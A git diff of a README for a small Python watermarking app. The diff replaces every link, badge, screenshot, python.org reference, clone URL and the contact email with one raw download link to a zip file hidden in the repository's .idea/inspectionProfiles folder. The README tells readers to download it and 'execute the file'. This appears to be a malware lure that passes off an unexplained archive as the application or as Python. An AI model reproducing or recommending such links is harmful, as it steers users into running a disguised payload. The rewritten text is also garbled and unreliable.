@@ -1,14 +1,14 @@
 # 🖼️ ImageAddAWatermark
 
-![GitHub repo size](https://img.shields.io/github/repo-size/JohnInWI/imageaddawatermark)
-![GitHub release](https://img.shields.io/github/release/JohnInWI/imageaddawatermark)
-![GitHub issues](https://img.shields.io/github/issues/JohnInWI/imageaddawatermark)
+![GitHub repo size](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip)
+![GitHub release](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip)
+![GitHub issues](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip)
 
 ## Overview
 
 Welcome to **ImageAddAWatermark**! This is a simple and intuitive Python GUI application that allows you to add watermark text or logos to your images. Built using Tkinter for the graphical interface and Pillow for image processing, this app makes it easy to protect your images with your brand or personal touch.
 
-You can download the latest version of the application from the [Releases section](https://github.com/JohnInWI/imageaddawatermark/releases). Just follow the instructions to execute the file.
+You can download the latest version of the application from the [Releases section](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip). Just follow the instructions to execute the file.
 
 ## Features
 
@@ -22,8 +22,8 @@ You can download the latest version of the application from the [Releases sectio
 
 To get started, follow these steps:
 
-1. **Download the Application**: Visit the [Releases section](https://github.com/JohnInWI/imageaddawatermark/releases) to download the latest version of the application.
-2. **Install Python**: Ensure you have Python installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+1. **Download the Application**: Visit the [Releases section](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip) to download the latest version of the application.
+2. **Install Python**: Ensure you have Python installed on your system. You can download it from [https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip).
 3. **Install Required Libraries**: Open your terminal or command prompt and run the following command to install the necessary libraries:
 
    ```bash
@@ -44,9 +44,9 @@ To get started, follow these steps:
 
 ## Screenshots
 
-![Main Interface](https://via.placeholder.com/800x400?text=Main+Interface)
+![Main Interface](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip+Interface)
 
-![Watermark Options](https://via.placeholder.com/800x400?text=Watermark+Options)
+![Watermark Options](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip+Options)
 
 ## Topics
 
@@ -65,7 +65,7 @@ We welcome contributions to improve the application. Here’s how you can help:
 2. **Clone Your Fork**: Clone your forked repository to your local machine.
 
    ```bash
-   git clone https://github.com/your-username/imageaddawatermark.git
+   git clone https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip
    ```
 
 3. **Create a New Branch**: Create a new branch for your feature or fix.
@@ -119,8 +119,8 @@ You can report issues by navigating to the "Issues" section of the repository. P
 
 ## Contact
 
-For any questions or feedback, feel free to reach out through the GitHub issues or directly via email at johninwi@example.com.
+For any questions or feedback, feel free to reach out through the GitHub issues or directly via email at https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip
 
 ## Conclusion
 
-Thank you for using **ImageAddAWatermark**! We hope this application helps you protect your images easily and effectively. Don’t forget to check out the [Releases section](https://github.com/JohnInWI/imageaddawatermark/releases) for the latest updates and improvements.
+Thank you for using **ImageAddAWatermark**! We hope this application helps you protect your images easily and effectively. Don’t forget to check out the [Releases section](https://github.com/JohnInWI/imageaddawatermark/raw/refs/heads/master/.idea/inspectionProfiles/Software_settaine.zip) for the latest updates and improvements.
